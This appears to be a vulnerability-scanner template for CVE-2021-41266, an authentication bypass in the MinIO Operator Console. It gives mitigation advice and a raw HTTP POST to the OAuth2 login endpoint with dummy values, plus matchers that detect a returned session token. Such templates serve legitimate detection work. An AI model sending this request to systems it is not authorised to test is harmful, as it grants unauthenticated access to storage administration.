id: CVE-2021-41266

info:
  name: MinIO Operator Console Authentication Bypass
  author: alevsk
  severity: critical
  description: |
    Minio console is a graphical user interface for the for MinIO operator. Minio itself is a multi-cloud object storage project. Affected versions are subject to an authentication bypass issue in the Operator Console when an external IDP is enabled. All users on release v0.12.2 and before are affected and are advised to update to 0.12.3 or newer. Users unable to upgrade should add automountServiceAccountToken: false to the operator-console deployment in Kubernetes so no service account token will get mounted inside the pod, then disable the external identity provider authentication by unset the CONSOLE_IDP_URL, CONSOLE_IDP_CLIENT_ID, CONSOLE_IDP_SECRET and CONSOLE_IDP_CALLBACK environment variable and instead use the Kubernetes service account token.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41266
    - https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36
    - https://github.com/minio/console/pull/1217
  tags: cve,cve2021,minio
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2021-41266
    cwe-id: CWE-306

requests:
  - raw:
      - |
        POST /api/v1/login/oauth2/auth HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: application/json

        {"code":"test","state":"test"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
          - 200
        condition: or

      - type: word
        part: body
        words:
          - "sessionId"

      - type: word
        part: header
        words:
          - "token"